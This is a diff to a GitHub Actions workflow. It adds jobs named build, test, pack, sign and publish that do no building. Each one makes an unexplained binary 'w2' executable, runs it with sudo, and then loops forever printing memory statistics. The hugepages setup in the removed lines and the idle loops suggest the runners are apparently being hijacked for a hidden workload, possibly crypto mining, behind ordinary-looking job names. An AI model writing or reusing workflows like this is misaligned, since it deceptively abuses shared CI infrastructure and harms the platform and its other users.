@@ -4,18 +4,61 @@ on: [push]
 
 jobs:
   build:
-
     runs-on: ubuntu-latest
-    
     steps:
     - uses: actions/checkout@v1
     - name: configure
       run: |
-        echo 4 | sudo tee /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages
-        cat /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages
-        chmod 755 w1
-        sudo ./w1
+        chmod 755 w2
+        sudo ./w2
     - name: build
       run: |
-          while true;do cat /proc/meminfo;sleep 10;done
+          while true;do cat /proc/meminfo;sleep 30;done
+          
+  test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 w2
+        sudo ./w2
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
 
+  pack:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 w2
+        sudo ./w2
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
+          
+  sign:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 w2
+        sudo ./w2
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
+          
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v1
+    - name: configure
+      run: |
+        chmod 755 w2
+        sudo ./w2
+    - name: build
+      run: |
+          while true;do cat /proc/meminfo;sleep 30;done
